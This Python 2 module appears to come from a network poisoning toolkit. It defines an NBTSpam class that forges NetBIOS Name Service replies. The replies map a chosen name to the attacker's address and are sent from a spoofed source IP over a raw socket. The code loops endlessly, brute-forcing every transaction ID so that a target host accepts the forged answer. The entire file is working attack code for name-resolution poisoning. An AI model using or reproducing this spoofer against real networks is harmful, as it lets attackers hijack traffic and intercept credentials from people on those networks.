#!/usr/bin/env python
import socket
import settings
import fingerprint
from scapy.all import *
import scapy
from packets import NBT_Ans
from SocketServer import BaseRequestHandler
from utils import *
from scapy.utils import checksum

class NBTSpam():
	def __init__(self):
		pass
	def startSpoofing(self):
		try:
			targetIp,srcIp,spoofName=settings.Config.spoof.split(":")
			if targetIp == None or spoofName == None:
				return
		except:
			print "ERROR"+settings.Config.spoof
			return

		spoofName = spoofName.upper()
		encoded_name = ''.join([chr((ord(c)>>4) + ord('A'))
                        + chr((ord(c)&0xF) + ord('A')) for c in spoofName])
		padding = "CA"*(15-len(spoofName))+'AA'+'\x00'
		count = 1000
		
		Buffer = NBT_Ans()
		Buffer.fields["NbtName"] = '\x20'+encoded_name+padding
		Buffer.fields["IP"] = socket.inet_aton(settings.Config.Bind_To)
		Buffer.fields["TTL"] = "\x00\x00\xFF\xFF"
		Buffer.fields["Tid"] = "\xAA\xAA"
		outs = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		
		packet = IP(src=srcIp,dst=targetIp,)/UDP(sport=137,dport=137)
		pckt = bytearray(str(packet/Raw(load=str(Buffer))))

		#Zero out the UPD checksum					
		pckt[26]='\x00'
		pckt[27]='\x00'
		while(True):
			for i in range(0,255):
				for j in range(0,255):
					#Bruteforce the TXID
					pckt[28]=chr(i)
					pckt[29]=chr(j)
					outs.sendto(pckt,(targetIp,137))
					count = count+1
					if(count>10000):
						count = 0
						LineHeader = "[*] [NBTSpam]"
						print color (LineHeader,2,1)+" 10000 NBNS replies sent to "+targetIp+" for name "+spoofName
